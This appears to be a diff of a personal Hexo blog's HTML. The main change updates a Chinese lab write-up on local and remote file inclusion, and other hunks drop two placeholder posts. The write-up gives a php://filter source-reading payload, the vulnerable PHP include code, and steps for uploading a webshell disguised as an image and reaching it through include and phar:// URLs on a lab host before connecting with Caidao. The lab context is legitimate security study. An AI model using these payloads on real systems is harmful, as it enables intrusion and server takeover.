@@ -172,7 +172,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-05-01 12:18:04 / 修改时间：12:20:17" itemprop="dateCreated datePublished" datetime="2020-05-01T12:18:04+08:00">2020-05-01</time>
+              <time title="创建时间：2020-05-01 12:51:26 / 修改时间：12:51:53" itemprop="dateCreated datePublished" datetime="2020-05-01T12:51:26+08:00">2020-05-01</time>
             </span>
 
           
@@ -186,7 +186,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <center><font size="7">文件包含漏洞实验</font></center>
+          <center><font size=7>文件包含漏洞实验</font></center>
 <center>gwolfs</center>
 
 <h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>（1）提示include.php，访问include.php</p>
@@ -194,7 +194,7 @@
 <p>（3）尝试读取源代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;include.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/uncategorized/%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20200421212856583-1588306814734.png" alt="image-20200421212856583"></p>
+<p><img src="/assets/image-20200421212856583-1588308709161.png" alt="image-20200421212856583"></p>
 <p>base64解码后：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">Tips: the parameter is file! :) </span><br><span class="line">&lt;!-- upload.php --&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    @$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">    if(isset($file))</span><br><span class="line">    &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;http|data|ftp|input|%00&#x2F;i&#39;, $file) || strstr($file,&quot;..&quot;) !&#x3D;&#x3D; FALSE || strlen($file)&gt;&#x3D;70)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;p&gt; error! &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            include($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -205,11 +205,11 @@
 <p>上传一个一句话木马post.php。发现上传失败</p>
 <p>因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png.</p>
 <p>上传成功：</p>
-<p><img src="/uncategorized/%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20200421225912301-1588306814734.png" alt="image-20200421225912301"></p>
+<p><img src="/assets/image-20200421225912301-1588308709163.png" alt="image-20200421225912301"></p>
 <p>接下来进行文件包含。</p>
 <p> <a href="http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png" target="_blank" rel="noopener">http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png</a> </p>
 <p>利用菜刀连接即可。</p>
-<p><img src="/uncategorized/%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20200421230943902-1588306814734.png" alt="image-20200421230943902"></p>
+<p><img src="/assets/image-20200421230943902-1588308709163.png" alt="image-20200421230943902"></p>
 <h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>（1）参数有file,提示php文件。代表只输入文件名就可以。</p>
 <p>猜测代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file&#x3D;$_GET[&#39;file&#39;].&quot;php&quot;;</span><br><span class="line">include($file);</span><br></pre></td></tr></table></figure>
@@ -219,10 +219,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">Tips:  </span><br><span class="line">&lt;!-- upload.php --&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    @$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">    if(isset($file))</span><br><span class="line">    &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;http|data|ftp|input|%00&#x2F;i&#39;, $file) || strstr($file,&quot;..&quot;) !&#x3D;&#x3D; FALSE || strlen($file)&gt;&#x3D;70)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;p&gt; error! &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            include($file.&#39;.php&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>题目要求phar，现在上传一个zip文件。</p>
-<p><img src="/uncategorized/%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20200421231446262-1588306814734.png" alt="image-20200421231446262"></p>
+<p><img src="/assets/image-20200421231446262-1588308709163.png" alt="image-20200421231446262"></p>
 <p>发现不能上传zip。抓包看下是基于什么机制过滤的。</p>
 <p>发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg</p>
-<p><img src="/uncategorized/%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20200421232107205-1588306814734.png" alt="image-20200421232107205"></p>
+<p><img src="/assets/image-20200421232107205-1588308709164.png" alt="image-20200421232107205"></p>
 <p>然后利用phar协议访问zip中的post.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.75.177&#x2F;vulnlab&#x2F;include&#x2F;2&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;webshell.jpg&#x2F;post.php</span><br></pre></td></tr></table></figure>
 
@@ -236,65 +236,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.105.75.177&#x2F;vulnlab&#x2F;include&#x2F;2&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;vulnlab&#x2F;include&#x2F;1&#x2F;upload&#x2F;webshell.jpg&#x2F;post</span><br></pre></td></tr></table></figure>
 
 <p>菜刀连接，成功连接</p>
-<p><img src="/uncategorized/%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20200421233702677-1588306814734.png" alt="image-20200421233702677"></p>
+<p><img src="/assets/image-20200421233702677-1588308709164.png" alt="image-20200421233702677"></p>
 
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/uncategorized/test1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="gwolfs">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="gwolfs的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/uncategorized/test1/" class="post-title-link" itemprop="url">test1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-05-01 12:16:48" itemprop="dateCreated datePublished" datetime="2020-05-01T12:16:48+08:00">2020-05-01</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
       
     </div>
 
@@ -420,83 +363,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/uncategorized/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="gwolfs">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="gwolfs的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/uncategorized/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-04-29 23:31:27" itemprop="dateCreated datePublished" datetime="2020-04-29T23:31:27+08:00">2020-04-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-04-30 20:56:06" itemprop="dateModified" datetime="2020-04-30T20:56:06+08:00">2020-04-30</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
 
@@ -563,7 +429,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
